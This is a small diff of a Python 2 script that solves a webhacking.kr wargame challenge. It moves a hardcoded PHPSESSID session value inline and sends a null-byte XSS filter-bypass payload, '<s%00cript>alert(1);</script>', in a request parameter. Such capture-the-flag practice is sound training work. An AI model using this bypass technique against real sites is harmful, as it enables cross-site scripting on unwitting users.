@@ -3,9 +3,8 @@ import urllib2
 import CookieManager
 
 challengeUrl = "http://webhacking.kr/challenge/bonus/bonus-3/"
-sessionId = "e28ad7cb81a98a13982054373940bf92"
 
-CookieManager.addCookie("PHPSESSID", sessionId)
+CookieManager.addCookie("PHPSESSID", "e28ad7cb81a98a13982054373940bf92")
     
 parameter = "<s%00cript>alert(1);</script>"
 httpRequest = urllib2.Request(challengeUrl + "?code=" + parameter)
